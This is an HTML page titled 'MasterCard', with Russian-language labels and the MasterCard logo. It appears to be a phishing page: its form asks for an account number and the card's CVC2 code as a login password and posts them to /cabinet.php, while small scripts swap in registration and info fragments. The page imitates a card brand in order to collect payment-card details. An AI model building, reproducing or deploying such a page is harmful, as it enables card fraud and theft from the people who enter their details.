<!DOCTYPE HTML>
<meta charset="utf-8">
<title>MasterCard</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
	body {
	sans-family: arial;
	}
	#hat {
	margin-top:0px;
	border-bottom-style: solid;
	border-bottom-width: 1px;
	border-bottom-color: gray;
	}
	#warning {
	background: repeat-y #FFDAB9;
	margin-left: 15px;
	margin-right: 15px;
	}
	#ok {
	background: repeat-y #66FF66;
	margin-left: 15px;
	margin-right: 15px;
	}
	#pod {
	margin-bottom: 10px;
	}
</style>
<div id="hat"><table><tr><td><img src="http://images.all-free-download.com/images/graphiclarge/mastercard_logo_29764.jpg" width="80px"></td><td><a style="color:#000000;" href="help.php">Помощь</a></td></tr></table></div></br>
<center>
<div class="utm-patented" style="width:301px;">
<div id="reg">
<form method="POST" action="/cabinet.php">
<input type="text" class="form-control" name="num" placeholder="Номер счёта">
<input type="password" class="form-control" placeholder="CVC2" name="cvc"></br>
<input type="button" class="btn btn-primary btn-lg btn-block" onclick="loadreg();" value="Регистрация">
<input type="submit" class="btn btn-success btn-lg btn-block" value="Вход">
</form>
</div>
</div>
</center>
<div id="pod">
<center>
<a href="javascript:loadinfo();">Подробнее</a>
</center>
</div>
<script>
function loadreg()
{
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("reg").innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open("GET","/registration.txt",true);
xmlhttp.send();
}
function loadinfo()
{
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("reg").innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open("GET","/info.txt",true);
xmlhttp.send();
}
function login()
{
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("reg").innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open("GET","/login.txt",true);
xmlhttp.send();
}
</script>